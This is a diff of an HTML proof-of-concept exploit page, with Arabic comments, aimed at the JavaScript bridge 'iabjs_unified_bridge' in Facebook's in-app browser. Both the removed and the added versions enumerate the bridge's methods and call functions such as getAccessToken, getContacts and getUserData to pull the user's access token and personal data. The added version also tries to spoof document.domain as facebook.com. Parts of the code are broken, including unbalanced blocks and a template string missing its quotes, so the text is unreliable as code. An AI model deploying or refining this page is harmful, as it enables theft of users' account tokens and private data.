@@ -1,92 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
+<meta name="referrer" content="no-referrer">
+<script>
+    // محاولة إيهام المتصفح أننا في نطاق فيسبوك
+    Object.defineProperty(document, 'domain', {value: 'facebook.com'});
+</script>
     <title>Meta RCE PoC - Security Research</title>
     <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; background: #000; overflow-x: auto; font-size: 12px; }
-        .success { color: #fff; background: #008000; padding: 2px 5px; font-weight: bold; }
-        .danger { color: #ff0000; font-weight: bold; }
+        body { font-family: sans-serif; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 20px; background: #000; }
     </style>
 </head>
 <body>
-    <h1>[!] Meta Internal Bridge Scanner</h1>
-    <div id="status">Scanning for iabjs_unified_bridge...</div>
+    <h1>[!] Facebook Bridge Exploitation...</h1>
+    <div id="status">جاري البحث عن الجسر...</div>
     <div class="log" id="output"></div>
 
     <script>
-        var output = document.getElementById('output');
-        var status = document.getElementById('status');
+        const output = document.getElementById('output');
+        const status = document.getElementById('status');
 
         function log(msg) {
-            output.innerHTML += "> " + msg + "<br>";
-            console.log(msg);
+            output.innerHTML += > ${msg}<br>;
         }
 
-       function startExploit() {
-    log("Checking for bridge injection...");
+        // 1. التحقق من وجود الجسر (iabjs_unified_bridge)
+        if (window.iabjs_unified_bridge) {
+            status.innerHTML = "✅ تم العثور على الجسر: iabjs_unified_bridge";
+            log("بدء فحص الدوال المتاحة...");
 
-    if (window.iabjs_unified_bridge) {
-        status.innerHTML = "<span class='success'>BRIDGE ACTIVE</span>";
-        log("[+] FOUND: iabjs_unified_bridge");
+            // 2. استخراج كافة الدوال المتاحة داخل الجسر (Reflection)
+            const methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
+            log("الدوال المكتشفة: " + methods.join(", "));
 
-        const secretMethods = [
-            'getAccessToken', 
-            'getContacts', 
-            'getUserData', 
-            'sendIntent', 
-            'execute'
-        ];
-
-        log("Attempting Blind Call for hidden methods...");
-
-        secretMethods.forEach(function(method) {
-            // محاولة الاستدعاء حتى لو لم تكن الدالة مرئية في الفحص
+            // 3. محاولة استدعاء دالة لجلب معلومات الحساسة (مثال)
             try {
-                log("Testing: " + method + "...");
-                
-                window.iabjs_unified_bridge[method](function(result) {
-                    log("<span class='danger'>🚨 SUCCESS! Data from " + method + ": </span>" + JSON.stringify(result));
+                // هنا نستخدم اسم دالة وجدتها في تحليل الـ DEX
+                // ملاحظة: قد تحتاج لتعديل اسم الدالة بناءً على ما وجدته في YeY.java
+                window.iabjs_unified_bridge.getAccessToken((token) => {
+                    log("🚨 تم سحب الـ Access Token بنجاح: " + token);
                 });
-            } catch(e) { 
-                log("[-] Method " + method + " failed or requires different arguments."); 
+            } catch(e) {
+                log("❌ فشل استدعاء الدالة المباشرة، المحاولة عبر الـ Invoke...");
             }
-        });
-
-    } else {
-        log("[-] Bridge not found. Retrying...");
-        setTimeout(startExploit, 1000);
-    }
-}
-
-                log("Attempting to brute-force hidden methods...");
-
-                secretMethods.forEach(function(method) {
-                    if (window.iabjs_unified_bridge[method]) {
-                        log("<span class='success'>🔥 Detected sensitive method: " + method + "</span>");
-                        
-                        try {
-                            // محاولة استدعاء الدالة لجلب البيانات
-                            window.iabjs_unified_bridge[method](function(result) {
-                                log("<span class='danger'>🚨 EXFILTRATED DATA (" + method + "): </span>" + JSON.stringify(result));
-                            });
-                        } catch(e) { 
-                            log("[-] Could not execute " + method + ": " + e.message); 
-                        }
-                    } else {
-                        log("[-] Method " + method + " not found.");
-                    }
-                });
-                // ------------------------------
-
-            } else {
-                log("[-] Bridge not found yet. Retrying in 1s...");
-                setTimeout(startExploit, 1000);
-            }
+        } else {
+            status.innerHTML = "❌ لم يتم العثور على الجسر. تأكد من فتح الرابط داخل متصفح فيسبوك.";
         }
-
-        window.onload = startExploit;
     </script>
 </body>
+
 </html>
